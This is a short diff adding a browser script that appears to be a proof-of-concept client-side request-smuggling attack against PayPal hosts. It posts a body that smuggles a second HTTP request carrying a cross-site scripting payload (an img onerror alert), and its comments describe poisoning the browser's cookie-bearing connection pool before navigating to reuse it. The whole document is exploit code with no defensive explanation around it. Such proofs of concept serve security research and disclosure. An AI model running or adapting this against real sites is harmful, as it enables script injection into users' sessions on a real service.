@@ -1,0 +1,10 @@
+<script>
+fetch('https://api.paypal.com/_avirum_/AVIi0541635410430003AVIl0AVIr1/rum.js', {
+  method: 'POST',
+  body: `HEAD /home/?cb=${Date.now()} HTTP/1.1\r\nHost: www.paypalobjects.com\r\nConnection: keep-alive\r\n\r\nGET /ppdevdocs?id=<img/src/&/onerror=alert(1)> HTTP/1.1\r\nHost: www.paypalobjects.com\r\nConnection: close\r\nx: x`, // malicious prefix
+  mode: 'no-cors', // ensure connection ID is visible
+  credentials: 'include' // poison 'with-cookies' pool
+}).then(() => {
+  location = 'https://api.paypal.com/test.js' // use the poisoned connection
+})
+</script>
